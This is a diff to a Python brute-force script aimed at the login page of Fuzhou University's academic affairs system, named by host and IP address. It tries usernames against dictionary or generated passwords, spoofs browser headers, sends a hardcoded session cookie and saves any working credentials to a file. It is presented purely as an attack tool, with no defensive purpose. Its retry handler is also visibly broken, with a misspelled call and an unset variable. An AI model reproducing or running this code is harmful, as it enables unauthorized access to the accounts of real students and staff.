@@ -1,8 +1,14 @@
 #! /usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-import os, re, random
-from urllib import request, parse
+'''
+Blasting for jwch.fzu.edu.cn
+low password
+could use dictionanry
+'''
+
+import os, re, random#, time, logging
+from urllib import request, parse, error
 
 def GetImformation(t):
 	muser = []
@@ -24,11 +30,14 @@ def Blasting(muser, dictionary):
 	url = 'http://59.77.226.32/logincheck.asp'
 	head = {
 		'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
+		'Accept': 'text/html',
+		'Accept-Language': 'en-US,en;q=0.5',
+		'Accept-Encoding': 'gzip, deflate',
+		'DNT': '1',
 		'Referer': 'http://jwch.fzu.edu.cn/',
-		'Content-Type': 'application/x-www-form-urlencoded',
+		'Cookie': 'ASPSESSIONIDSATDARTQ=NFFMALJBPNBBLNGMHOMBLDPG'
 	}
-	req = request.Request(url, headers = head)
-	data = {'muser': '', 'passwd': '', 'x': '0', 'y': '0'}
+	data = {'Content-Type': 'application/x-www-form-urlencoded', 'muser': '', 'passwd': '', 'x': '0', 'y': '0'}
 	re_pass = re.compile('福州大学教务处本科教学管理系统')
 
 	path = os.path.abspath('.')
@@ -36,16 +45,25 @@ def Blasting(muser, dictionary):
 
 	if dictionary != '':
 		p = open(dictionary)
+		passwd = p.readlines()
+		p.close()
 		for user in muser:
 			data['muser'] = user
 			
-			for x in p.readlines():
-				data['passwd'] = x
-				#time.sleep(1) #Invalid method
-				response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				if re_pass.search(response.read().decode('utf-8')):
-					f.write('muser: %s\tpasswd: %s\n' % (data['muser'], data['passwd']))
+			for x in passwd:
+				data['passwd'] = x[:-1]
+				#time.sleep(5) #Invalid method
+				req = request.Request(url, headers = head)
+				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
+				try :
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
+				except error.HTTPError as e:
+					req = request.Ruequest(response.geturl(), headers = head)
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
+				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
+					f.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
 					f.flush()
+					break
 
 	else:
 		passwd = []
@@ -59,12 +77,18 @@ def Blasting(muser, dictionary):
 
 			for pw in passwd:
 				data['passwd'] = pw
-				#time.sleep(1) #Invalid method
-				response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
-				if re_pass.search(response.read().decode('utf-8')):
-					f.write('muser: %s\tpasswd: %s\n' % (data['muser'], data['passwd']))
+				#time.sleep(5) #Invalid method
+				req = request.Request(url, headers = head)
+				print('Try password: %s for user: %s' % (data['passwd'], data['muser']))
+				try :
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))	
+				except error.HTTPError as e:
+					req = request.Ruequest(response.geturl(), headers = head)
+					response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
+				if re_pass.search(response.read().decode(encoding = 'utf-8', errors = 'ignore')):
+					f.write('user: %s\tpassword: %s\n' % (data['muser'], data['passwd']))
 					f.flush()
-
+					break
 	f.close()
 
 
